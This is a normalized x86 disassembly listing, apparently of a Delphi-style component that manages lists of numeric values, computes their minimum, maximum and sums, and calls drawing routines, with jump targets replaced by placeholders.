mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x4 ]
cmp [ edx + 0x8f ] 0x0
je r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
add [ edx ] eax
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub [ edx + 0x8 ] eax
jmp r-xdata
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
sub [ edx + 0xc ] eax
pop ebp
retn
mov edx [ ebp + 0x8 ]
mov edx [ edx - 0x8 ]
add [ edx + 0x4 ] eax
jmp r-xdata
pop ebp
retn
sub_4689cc
push ebp
mov ebp esp
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx - 0x4 ]
cmp [ ecx + 0x8e ] 0x0
je r-xdata
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx - 0x4 ]
cmp [ ecx + 0x8f ] 0x0
je r-xdata
mov ecx [ ebp + 0x8 ]
mov ecx [ ecx - 0x4 ]
cmp [ ecx + 0x8f ] 0x0
je r-xdata
sub eax edx
add eax edx
jmp r-xdata
add eax edx
pop ebp
retn
sub eax edx
jmp r-xdata
pop ebp
retn
sub_468a0c
push ebp
mov ebp esp
mov edx [ ebp + 0x8 ]
push edx
call sub_468970
pop ecx
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
call sub_466f10
pop ebp
retn
sub_468a2c
push ebp
mov ebp esp
add esp 0xfffffff8
push ebx
push esi
push edi
mov ebx ecx
mov [ ebp - 0x8 ] edx
mov [ ebp - 0x4 ] eax
lea edi [ ebp - 0x4 ]
mov eax [ edi ]
call sub_464db4
mov edx [ edi ]
mov [ edx + 0xc8 ] al
test bl bl
je r-xdata
mov edx [ ebp - 0x8 ]
mov eax [ edi ]
call sub_466f10
mov edx eax
mov ecx [ ebp - 0x8 ]
mov eax [ edi ]
call sub_466e94
mov ebx eax
mov eax [ edi ]
mov [ eax + 0x2c ] ebx
push ebp
mov eax [ edi ]
call sub_468854
mov edx eax
mov eax ebx
call sub_4689cc
pop ecx
mov esi eax
mov eax [ edi ]
mov [ eax + 0x5c ] esi
push ebp
mov eax [ edi ]
call sub_4688a4
mov edx eax
mov eax esi
call sub_4689cc
pop ecx
mov edx [ edi ]
mov [ edx + 0x38 ] eax
mov eax [ edi ]
cmp [ eax + 0xe0 ] 0x0
je r-xdata
mov eax [ edi ]
mov ebx [ eax + 0x30 ]
cmp [ ebx + 0x14 ] 0x0
je r-xdata
mov eax [ ebp - 0x8 ]
mov eax [ eax + 0x8 ]
mov edx [ edi ]
mov [ edx + 0x38 ] eax
jmp r-xdata
mov eax [ edi ]
cmp [ eax + 0x41 ] 0x0
je r-xdata
push ebp
mov eax [ edi ]
call sub_46888c
call sub_468a0c
pop ecx
mov edx [ edi ]
mov [ edx + 0x38 ] eax
mov eax [ edi ]
call sub_468854
mov ebx eax
mov eax [ edi ]
mov eax [ eax + 0x90 ]
mov edx [ edi ]
mov ecx [ eax ]
call [ ecx + 0xf8 ]
add ebx eax
test ebx ebx
jle r-xdata
push ebp
mov eax [ edi ]
call sub_4688a4
call sub_468a0c
pop ecx
mov edx [ edi ]
mov [ edx + 0x5c ] eax
mov ecx [ ebp - 0x8 ]
mov eax [ edi ]
mov edx [ eax + 0x38 ]
mov eax [ edi ]
call sub_466e94
mov edx [ edi ]
mov [ edx + 0x38 ] eax
mov ecx [ ebp - 0x8 ]
mov eax [ edi ]
mov edx [ eax + 0x5c ]
mov eax [ edi ]
call sub_466e94
mov edx [ edi ]
mov [ edx + 0x5c ] eax
jmp r-xdata
push ebp
mov eax ebx
call sub_468970
pop ecx
pop edi
pop esi
pop ebx
pop ecx
pop ecx
pop ebp
retn
sub_468b50
mov ecx [ edx + 0x4 ]
mov [ eax + 0x4 ] ecx
mov ecx [ edx + 0x8 ]
mov [ eax + 0x8 ] ecx
mov ecx [ edx + 0xc ]
mov [ eax + 0xc ] ecx
mov ecx [ edx + 0x10 ]
mov [ eax + 0x10 ] ecx
mov ecx [ edx + 0x1c ]
mov [ eax + 0x1c ] ecx
mov ecx [ edx + 0x20 ]
mov [ eax + 0x20 ] ecx
mov ecx [ edx + 0x18 ]
mov [ eax + 0x18 ] ecx
mov edx [ edx + 0x24 ]
mov [ eax + 0x24 ] edx
retn
sub_468b84
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x18 ]
push eax
push esi
mov ecx [ ebx + 0x24 ]
mov edx [ ebx + 0x20 ]
mov eax [ ebx + 0x1c ]
call sub_412c08
pop esi
pop ebx
retn
sub_468ba0
push ebp
mov ebp esp
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403168
mov [ edi + 0x54 ] 0x1
xor eax eax
mov [ edi + 0x20 ] eax
mov [ edi + 0x24 ] 0x3ff00000
mov eax esi
mov [ edi + 0x30 ] eax
mov eax [ eax + 0x80 ]
mov edx edi
call sub_413eec
lea eax [ edi + 0x28 ]
mov edx [ ebp + 0x8 ]
call sub_403f3c
mov dl 0x1
mov eax [ r-xdata ]
call sub_403168
mov [ edi + 0x8 ] eax
mov eax edi
mov edx [ eax ]
call [ edx + 0x14 ]
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034bc
mov eax edi
pop edi
pop esi
pop ebx
pop ebp
retn 0x4
call sub_403514
pop [ fs : 0x0 ]
add esp 0xc
sub_468c24
push ebx
push esi
call sub_403524
mov ebx edx
mov esi eax
mov eax [ esi + 0x8 ]
call sub_403198
mov edx ebx
and dl 0xfc
mov eax esi
call sub_414628
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40350c
sub_468c5c
push ebx
add esp 0xfffffff8
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
mov edx eax
dec edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xc ]
fstp [ esp ]
fwait
fld [ esp ]
pop ecx
pop edx
pop ebx
retn
sub_468c80
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x8 ]
call sub_414098
mov edx 0x8
call sub_4026fc
mov edx esi
mov eax [ ebx + 0x8 ]
call sub_413f38
mov [ ebx + 0x54 ] 0x1
pop esi
pop ebx
retn
sub_468cac
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
mov eax 0x8
call sub_4026dc
mov edx [ ebp + 0x8 ]
mov [ eax ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x4 ] edx
mov ecx eax
mov edx esi
mov eax [ ebx + 0x8 ]
call sub_414114
mov [ ebx + 0x54 ] 0x1
pop esi
pop ebx
pop ebp
retn 0x8
sub_468ce0
push ebp
mov ebp esp
push ebx
push esi
push edi
mov ebx eax
mov eax 0x8
call sub_4026dc
mov edi eax
mov eax [ ebp + 0x8 ]
mov [ edi ] eax
mov eax [ ebp + 0xc ]
mov [ edi + 0x4 ] eax
cmp [ ebx + 0x2c ] 0x0
jne r-xdata
mov eax [ ebx + 0x8 ]
mov esi [ eax + 0x8 ]
dec esi
cmp esi 0xffffffff
je r-xdata
mov edx edi
mov eax [ ebx + 0x8 ]
call sub_413eec
mov esi eax
jmp r-xdata
mov edx edi
mov eax [ ebx + 0x8 ]
call sub_413eec
mov esi eax
jmp r-xdata
cmp [ ebx + 0x2c ] 0x1
jne r-xdata
mov [ ebx + 0x54 ] 0x1
mov eax esi
pop edi
pop esi
pop ebx
pop ebp
retn 0x8
cmp [ ebx + 0x2c ] 0x2
jne r-xdata
mov edx esi
mov eax [ ebx + 0x8 ]
call sub_414098
fld [ eax ]
fcomp [ ebp + 0x8 ]
fnstsw ax
sahf
jbe r-xdata
cmp [ ebx + 0x2c ] 0x1
jne r-xdata
mov edx esi
mov eax [ ebx + 0x8 ]
call sub_414098
fld [ eax ]
fcomp [ ebp + 0x8 ]
fnstsw ax
sahf
jb r-xdata
test esi esi
jl r-xdata
jmp r-xdata
inc esi
mov ecx edi
mov edx esi
mov eax [ ebx + 0x8 ]
call sub_414114
mov edx esi
mov eax [ ebx + 0x8 ]
call sub_414098
fld [ eax ]
fcomp [ ebp + 0x8 ]
fnstsw ax
sahf
jb r-xdata
test esi esi
jl r-xdata
dec esi
mov edx esi
mov eax [ ebx + 0x8 ]
call sub_414098
fld [ eax ]
fcomp [ ebp + 0x8 ]
fnstsw ax
sahf
ja r-xdata
dec esi
jmp r-xdata
sub_468dbc
push ebp
mov ebp esp
push ebx
mov ebx eax
fld [ ebp + 0x8 ]
fcomp [ ebx + 0x20 ]
fnstsw ax
sahf
je r-xdata
pop ebx
pop ebp
retn 0x8
mov eax [ ebp + 0x8 ]
mov [ ebx + 0x20 ] eax
mov eax [ ebp + 0xc ]
mov [ ebx + 0x24 ] eax
mov [ ebx + 0x54 ] 0x1
xor ecx ecx
mov dl 0x3
mov eax [ ebx + 0x30 ]
call sub_46cc98
mov eax [ ebx + 0x30 ]
call sub_46ae80
sub_468df8
push ebx
push esi
add esp 0xfffffff8
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x8 ]
call sub_414098
fld [ eax ]
fmul [ ebx + 0x20 ]
fstp [ esp ]
fwait
fld [ esp ]
pop ecx
pop edx
pop esi
pop ebx
retn
sub_468e1c
push ebp
mov ebp esp
push ebx
push esi
mov esi edx
mov ebx eax
mov edx esi
mov eax [ ebx + 0x8 ]
call sub_414098
mov edx [ ebp + 0x8 ]
mov [ eax ] edx
mov edx [ ebp + 0xc ]
mov [ eax + 0x4 ] edx
mov [ ebx + 0x54 ] 0x1
mov ecx esi
mov dl 0x4
mov eax [ ebx + 0x30 ]
call sub_46cc98
pop esi
pop ebx
pop ebp
retn 0x8
sub_468e50
push ebx
add esp 0xfffffff8
mov ebx eax
cmp [ ebx + 0x54 ] 0x0
je r-xdata
mov eax [ ebx + 0x10 ]
mov [ esp ] eax
mov eax [ ebx + 0x14 ]
mov [ esp + 0x4 ] eax
fld [ esp ]
pop ecx
pop edx
pop ebx
retn
mov eax ebx
call sub_468ef0
sub_468e78
push ebx
add esp 0xfffffff8
mov ebx eax
cmp [ ebx + 0x54 ] 0x0
je r-xdata
mov eax [ ebx + 0x18 ]
mov [ esp ] eax
mov eax [ ebx + 0x1c ]
mov [ esp + 0x4 ] eax
fld [ esp ]
pop ecx
pop edx
pop ebx
retn
mov eax ebx
call sub_468ef0
sub_468ea0
push ebx
add esp 0xfffffff8
mov ebx eax
cmp [ ebx + 0x54 ] 0x0
je r-xdata
mov eax [ ebx + 0x40 ]
mov [ esp ] eax
mov eax [ ebx + 0x44 ]
mov [ esp + 0x4 ] eax
fld [ esp ]
pop ecx
pop edx
pop ebx
retn
mov eax ebx
call sub_468ef0
sub_468ec8
push ebx
add esp 0xfffffff8
mov ebx eax
cmp [ ebx + 0x54 ] 0x0
je r-xdata
mov eax [ ebx + 0x48 ]
mov [ esp ] eax
mov eax [ ebx + 0x4c ]
mov [ esp + 0x4 ] eax
fld [ esp ]
pop ecx
pop edx
pop ebx
retn
mov eax ebx
call sub_468ef0
sub_468ef0
push ebx
push esi
push edi
add esp 0xfffffff8
mov ebx eax
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
test eax eax
jle r-xdata
xor eax eax
mov [ ebx + 0x18 ] eax
mov [ ebx + 0x1c ] eax
xor eax eax
mov [ ebx + 0x10 ] eax
mov [ ebx + 0x14 ] eax
xor eax eax
mov [ ebx + 0x40 ] eax
mov [ ebx + 0x44 ] eax
xor eax eax
mov [ ebx + 0x48 ] eax
mov [ ebx + 0x4c ] eax
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xc ]
fstp [ esp ]
fwait
mov eax [ esp ]
mov [ ebx + 0x18 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x1c ] eax
mov eax [ esp ]
mov [ ebx + 0x10 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x14 ] eax
mov eax [ esp ]
mov [ ebx + 0x40 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x44 ] eax
fld [ esp ]
fabs
fstp [ ebx + 0x48 ]
fwait
mov eax ebx
mov edx [ eax ]
call [ edx + 0x24 ]
mov esi eax
dec esi
test esi esi
jle r-xdata
mov [ ebx + 0x54 ] 0x0
pop ecx
pop edx
pop edi
pop esi
pop ebx
retn
mov edi 0x1
fld [ esp ]
fcomp [ ebx + 0x10 ]
fnstsw ax
sahf
jbe r-xdata
mov eax [ esp ]
mov [ ebx + 0x18 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x1c ] eax
jmp r-xdata
fld [ ebx + 0x40 ]
fadd [ esp ]
fstp [ ebx + 0x40 ]
fwait
fld [ esp ]
fabs
fadd [ ebx + 0x48 ]
fstp [ ebx + 0x48 ]
fwait
inc edi
dec esi
jne r-xdata
mov eax [ esp ]
mov [ ebx + 0x10 ] eax
mov eax [ esp + 0x4 ]
mov [ ebx + 0x14 ] eax
mov edx edi
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0xc ]
fstp [ esp ]
fwait
fld [ esp ]
fcomp [ ebx + 0x18 ]
fnstsw ax
sahf
jae r-xdata
jmp r-xdata
sub_468ff0
push ebx
push esi
push edi
mov esi eax
mov eax [ esi + 0x8 ]
mov ebx [ eax + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax [ esi + 0x8 ]
mov edx [ eax ]
call [ edx + 0x8 ]
mov edx [ rw-data ]
mov eax [ esi + 0x8 ]
call sub_4141fc
mov [ esi + 0x54 ] 0x1
pop edi
pop esi
pop ebx
retn
inc ebx
xor edi edi
mov edx edi
mov eax [ esi + 0x8 ]
call sub_414098
mov edx 0x8
call sub_4026fc
inc edi
dec ebx
jne r-xdata
sub_46903c
push ebx
push esi
push edi
push ebp
mov ebx [ eax + 0x8 ]
cmp [ ebx + 0x8 ] 0x0
jle r-xdata
pop ebp
pop edi
pop esi
pop ebx
retn
xor edx edx
mov eax ebx
call sub_414098
mov ebp eax
mov edi [ ebx + 0x8 ]
dec edi
test edi edi
jle r-xdata
mov edx [ ebx + 0x8 ]
dec edx
mov ecx ebp
mov eax ebx
call sub_41418c
mov esi 0x1
mov edx esi
mov eax ebx
call sub_414098
mov ecx eax
mov edx esi
dec edx
mov eax ebx
call sub_41418c
inc esi
dec edi
jne r-xdata
sub_46908c
push ebx
push esi
mov esi edx
mov ebx eax
mov eax [ ebx + 0x50 ]
mov edx esi
call sub_4042f4
je r-xdata
pop esi
pop ebx
retn
lea eax [ ebx + 0x50 ]
mov edx esi
call sub_403f3c
mov eax [ ebx + 0x30 ]
call sub_46a6d0
sub_4690b4
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_403324
test al al
je r-xdata
pop edi
pop esi
pop ebx
retn
mov edi esi
mov al [ edi + 0x2c ]
mov [ ebx + 0x2c ] al
mov al [ edi + 0x4 ]
mov [ ebx + 0x4 ] al
mov eax [ edi + 0x20 ]
mov [ ebx + 0x20 ] eax
mov eax [ edi + 0x24 ]
mov [ ebx + 0x24 ] eax
lea eax [ ebx + 0x50 ]
mov edx [ edi + 0x50 ]
call sub_403f3c
sub_4690f8
push ebx
push esi
mov esi edx
mov ebx eax
cmp esi [ ebx + 0x8 ]
jge r-xdata
xor eax eax
pop esi
pop ebx
retn
mov edx esi
mov eax ebx
call sub_414098
test eax eax
je r-xdata
mov edx esi
mov eax ebx
call sub_414098
pop esi
pop ebx
retn
sub_469124
push ebx
push esi
push edi
test dl dl
je r-xdata
mov esi ecx
mov ebx edx
mov edi eax
xor edx edx
mov eax edi
call sub_403168
mov [ edi + 0x20 ] esi
mov [ edi + 0x1c ] 0x2
mov eax [ edi + 0x20 ]
call sub_46a6b8
mov [ edi + 0x14 ] eax
mov [ edi + 0xc ] 0x80ffff
mov eax [ edi + 0x20 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x144 ]
push eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_45c64c
mov [ edi + 0x4 ] eax
mov [ edi + 0x8 ] 0x8
mov eax [ edi + 0x20 ]
push eax
mov eax [ eax ]
mov eax [ eax + 0x144 ]
push eax
call sub_460e8c
mov [ edi + 0x18 ] eax
mov dl 0x1
mov eax [ r-xdata ]
call sub_403168
mov [ edi + 0x24 ] eax
mov eax edi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034bc
mov eax edi
pop edi
pop esi
pop ebx
retn
call sub_403514
pop [ fs : 0x0 ]
add esp 0xc
sub_4691c0
push ebx
push esi
push edi
mov esi edx
mov ebx eax
mov eax esi
mov edx [ r-xdata ]
call sub_403324
test al al
je r-xdata
mov edx esi
mov eax ebx
call sub_414654
mov edi esi
mov edx [ edi + 0x4 ]
mov eax [ ebx + 0x4 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov eax [ edi + 0x8 ]
mov [ ebx + 0x8 ] eax
mov eax [ edi + 0xc ]
mov [ ebx + 0xc ] eax
mov al [ edi + 0x10 ]
mov [ ebx + 0x10 ] al
mov al [ edi + 0x11 ]
mov [ ebx + 0x11 ] al
mov edx [ edi + 0x14 ]
mov eax [ ebx + 0x14 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov edx [ edi + 0x18 ]
mov eax [ ebx + 0x18 ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov al [ edi + 0x1c ]
mov [ ebx + 0x1c ] al
mov al [ edi + 0x28 ]
mov [ ebx + 0x28 ] al
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_469298
push ebx
push esi
push edi
mov edi ecx
mov esi edx
mov ebx [ eax + 0x24 ]
jmp r-xdata
cmp esi [ ebx + 0x8 ]
jge r-xdata
xor edx edx
mov eax ebx
call sub_413eec
mov edx esi
mov eax ebx
call sub_414098
test eax eax
jne r-xdata
mov edx esi
mov eax ebx
call sub_4690f8
cmp [ eax + 0x14 ] 0x0
je r-xdata
mov dl 0x1
mov eax [ r-xdata ]
call sub_403168
mov [ eax + 0x14 ] 0x0
mov ecx eax
mov edx esi
mov eax ebx
call sub_41418c
mov edx [ edi ]
call sub_468b50
mov edx [ edi ]
xchg edx eax
call sub_468b50
jmp r-xdata
pop edi
pop esi
pop ebx
retn
sub_469300
push ebx
push esi
push edi
mov edi [ eax + 0x24 ]
mov ebx [ edi + 0x8 ]
dec ebx
test ebx ebx
jl r-xdata
mov eax edi
mov edx [ eax ]
call [ edx + 0x8 ]
pop edi
pop esi
pop ebx
retn
inc ebx
xor esi esi
mov edx esi
mov eax edi
call sub_4690f8
call sub_403198
inc esi
dec ebx
jne r-xdata
sub_469330
push ebx
push esi
call sub_403524
mov ebx edx
mov esi eax
mov eax [ esi + 0x18 ]
call sub_403198
mov eax [ esi + 0x14 ]
call sub_403198
mov eax [ esi + 0x4 ]
call sub_403198
mov eax esi
call sub_469300
mov eax [ esi + 0x24 ]
call sub_403198
mov edx ebx
and dl 0xfc
mov eax esi
call sub_414628
test bl bl
jle r-xdata
pop esi
pop ebx
retn
mov eax esi
call sub_40350c
sub_4693b0
push ebp
mov ebp esp
push ebx
push esi
mov esi eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x20 ]
mov eax [ eax + 0x68 ]
mov ebx [ eax + 0x288 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x9c ]
test al al
je r-xdata
push esi
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x5c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x2c ]
push eax
push esi
mov eax [ ebp + 0x8 ]
mov ecx [ eax - 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax - 0x4 ]
mov eax ebx
mov ebx [ eax ]
call [ ebx + 0x124 ]
jmp r-xdata
pop esi
pop ebx
pop ebp
retn
sub_469418
push ebp
mov ebp esp
xor ecx ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ecx
push ebx
push esi
xor eax eax
push ebp
push sub_46953c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax + 0x1c ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0x8 ]
mov edx [ edx + 0x24 ]
sar edx 0x1
jns r-xdata
add eax edx
mov [ ebp - 0x4 ] eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x8 ]
mov eax [ eax + 0x20 ]
mov [ ebp - 0x8 ] eax
lea eax [ ebp - 0x10 ]
mov edx [ rw-data ]
mov dl [ edx ]
call sub_4040d0
mov eax [ ebp - 0x10 ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0xc ]
call sub_40c6a4
mov ebx eax
test ebx ebx
jle r-xdata
adc edx 0x0
push ebp
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
call sub_4693b0
pop ecx
lea eax [ ebp - 0xc ]
mov edx [ ebp + 0x8 ]
mov edx [ edx + 0xc ]
call sub_403f80
mov eax [ ebp + 0x8 ]
mov eax [ eax - 0x4 ]
mov eax [ eax + 0x20 ]
mov eax [ eax + 0x68 ]
mov eax [ eax + 0x288 ]
call sub_45c9c4
mov esi eax
push ebp
lea eax [ ebp - 0x14 ]
push eax
mov ecx ebx
dec ecx
mov edx 0x1
mov eax [ ebp - 0xc ]
call sub_404408
mov eax [ ebp - 0x14 ]
call sub_4693b0
pop ecx
lea eax [ ebp - 0xc ]
push eax
lea edx [ ebx + 0x1 ]
mov ecx 0xff
mov eax [ ebp - 0xc ]
call sub_404408
add [ ebp - 0x8 ] esi
lea eax [ ebp - 0x18 ]
mov edx [ rw-data ]
mov dl [ edx ]
call sub_4040d0
mov eax [ ebp - 0x18 ]
mov edx [ ebp - 0xc ]
call sub_40c6a4
mov ebx eax
test ebx ebx
jne r-xdata
cmp [ ebp - 0xc ] 0x0
je r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_469543
lea eax [ ebp - 0x18 ]
mov edx 0x4
call sub_403f0c
retn
push ebp
mov eax [ ebp - 0xc ]
call sub_4693b0
pop ecx
jmp r-xdata
sub_46954c
push ebp
mov ebp esp
add esp 0xffffffd0
push ebx
push esi
push edi
mov [ ebp - 0x8 ] ecx
mov [ ebp - 0x4 ] eax
lea ecx [ ebp + 0x8 ]
mov eax [ ebp - 0x4 ]
call sub_469298
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x20 ]
mov eax [ esi + 0x68 ]
mov ebx [ eax + 0x288 ]
mov al [ eax + 0x278 ]
mov [ ebp - 0x15 ] al
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x4 ]
cmp [ eax + 0x21 ] 0x0
je r-xdata
cmp [ ebp - 0x15 ] 0x0
je r-xdata
mov edx eax
mov eax [ ebx + 0xc ]
mov ecx [ eax ]
call [ ecx + 0x8 ]
mov dl 0x1
mov eax [ ebx + 0x10 ]
call sub_41d734
cmp [ rw-data ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x14 ]
cmp [ eax + 0x21 ] 0x0
jne r-xdata
mov eax ebx
mov edx [ eax ]
call [ edx + 0x9c ]
test al al
jne r-xdata
cmp [ ebp - 0x15 ] 0x0
je r-xdata
mov eax [ ebx + 0xc ]
call sub_41d308
cmp eax [ ebp - 0x8 ]
je r-xdata
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0xc ]
mov eax [ ebx + 0x10 ]
call sub_41d618
mov eax [ ebp - 0x4 ]
movzx eax [ eax + 0x10 ]
mov dl [ eax + rw-data ]
mov eax [ ebx + 0x10 ]
call sub_41d734
mov eax [ ebp - 0x4 ]
mov edx [ eax + 0x14 ]
mov eax ebx
call sub_45c8bc
cmp [ ebp - 0x15 ] 0x0
je r-xdata
mov eax [ ebp - 0x4 ]
cmp [ eax + 0x10 ] 0x0
jne r-xdata
mov eax [ ebp + 0x8 ]
mov esi [ eax + 0xc ]
mov eax [ ebp + 0x8 ]
sub esi [ eax + 0x1c ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x10 ]
mov edx [ ebp + 0x8 ]
sub eax [ edx + 0x20 ]
mov [ ebp - 0x14 ] eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2c ]
push eax
lea eax [ ebp - 0x10 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x10 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax + 0xc ]
mov eax ebx
mov edi [ eax ]
call [ edi + 0xa4 ]
lea ecx [ ebp - 0x20 ]
mov edx [ ebp - 0xc ]
sub edx [ ebp - 0x14 ]
mov eax [ ebp - 0x10 ]
sub eax esi
call sub_412bb8
mov eax [ ebp + 0x8 ]
mov edx [ ebp - 0x20 ]
mov [ eax + 0x1c ] edx
mov edx [ ebp - 0x1c ]
mov [ eax + 0x20 ] edx
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x10 ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax + 0x4 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0x84 ]
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0xc ]
push eax
mov eax [ ebp + 0x8 ]
mov eax [ eax + 0x10 ]
push eax
mov eax [ ebp - 0x4 ]
mov eax [ eax + 0x2c ]
push eax
mov eax [ ebp + 0x8 ]
mov ecx [ eax + 0x8 ]
mov eax [ ebp + 0x8 ]
mov edx [ eax + 0x4 ]
mov eax ebx
mov esi [ eax ]
call [ esi + 0xe8 ]
jmp r-xdata
mov eax [ esi + 0x68 ]
cmp [ eax + 0x70 ] 0x0
sete al
and eax 0x7f
mov edx [ eax * 4 + rw-data ]
mov eax [ ebx + 0xc ]
call sub_41d310
mov eax [ ebx + 0xc ]
call sub_41d308
mov edx [ esi + 0x68 ]
cmp eax [ edx + 0x70 ]
jne r-xdata
lea edx [ ebp - 0x30 ]
mov eax [ ebp + 0x8 ]
call sub_468b84
lea edx [ ebp - 0x30 ]
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x70 ]
mov eax ebx
mov edx [ eax ]
call [ edx + 0x9c ]
test al al
je r-xdata
mov dl 0x1
mov eax [ ebx + 0x10 ]
call sub_41d734
mov edx 0x6
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x28 ]
push ebp
call sub_469418
pop ecx
xor edx edx
mov eax ebx
mov ecx [ eax ]
call [ ecx + 0x28 ]
pop edi
pop esi
pop ebx
mov esp ebp
pop ebp
retn 0x8
mov eax esi
call sub_41d434
mov edx [ ebp + 0x8 ]
add [ edx + 0x20 ] eax
lea edx [ ebp - 0x30 ]
mov eax [ ebp + 0x8 ]
call sub_468b84
lea edx [ ebp - 0x30 ]
mov eax [ ebp - 0x4 ]
mov ecx [ eax + 0x2c ]
inc ecx
mov eax ebx
mov esi [ eax ]
call [ esi + 0x10c ]
jmp r-xdata
mov eax [ ebp - 0x4 ]
mov esi [ eax + 0x14 ]
cmp [ esi + 0x21 ] 0x0
je r-xdata
sub_469788
push ebx
push esi
test dl dl
je r-xdata
mov ebx edx
mov esi eax
xor edx edx
mov eax esi
call sub_419a50
mov [ esi + 0x41 ] 0x1
mov [ esi + 0x39 ] 0x1
mov [ esi + 0x38 ] 0x0
xor eax eax
mov [ esi + 0x30 ] eax
mov [ esi + 0x34 ] eax
mov eax esi
test bl bl
je r-xdata
add esp 0xfffffff0
call sub_4034bc
mov eax esi
pop esi
pop ebx
retn
call sub_403514
pop [ fs : 0x0 ]
add esp 0xc
sub_469804
push ebp
mov ebp esp
push 0x0
push ebx
push esi
mov esi edx
mov ebx eax
xor eax eax
push ebp
push sub_46986c
push [ fs : eax ]
mov [ fs : eax ] esp
mov eax [ ebx + 0x3c ]
mov edx [ eax ]
call [ edx + 0x104 ]
mov edx [ eax + 0x50 ]
lea eax [ ebp - 0x4 ]
call sub_403f80
cmp [ ebp - 0x4 ] 0x0
jne r-xdata
mov edx [ ebp - 0x4 ]
mov eax esi
mov ecx [ eax ]
call [ ecx + 0xf0 ]
mov ebx eax
mov eax esi
mov edx [ eax ]
call [ edx + 0x104 ]
mov ebx eax
jmp r-xdata
xor eax eax
pop edx
pop ecx
pop ecx
mov [ fs : eax ] edx
push sub_469873
lea eax [ ebp - 0x4 ]
call sub_403ee8
retn
sub_46987c
push ebx
push esi
push edi
push ebp
add esp 0xffffffd8
mov edi ecx
mov esi edx
mov ebx eax
mov eax [ ebx + 0x3c ]
mov [ esp + 0x10 ] eax
push 0xffffffff
or ecx 0xffffffff
mov edx esi
mov eax ebx
mov ebp [ eax ]
call [ ebp + 0x3c ]
fstp [ esp + 0x8 ]
fwait
mov eax [ esp + 0x10 ]
cmp [ eax + 0xfa ] 0x0
jne r-xdata
mov eax esi
call sub_46a554
test al al
jne r-xdata
mov eax edi
call sub_468e78
fstp [ esp ]
fwait
push [ esp + 0x4 ]
push [ esp + 0x4 ]
push [ esp + 0x14 ]
push [ esp + 0x14 ]
mov eax esi
call sub_46a554
mov edx eax
mov eax ebx
call sub_469c34
mov eax edi
call sub_468e50
fstp [ esp ]
fwait
push [ esp + 0x4 ]
push [ esp + 0x4 ]
push [ esp + 0x14 ]
push [ esp + 0x14 ]
mov eax esi
call sub_46a554
mov edx eax
mov eax ebx
call sub_469c34
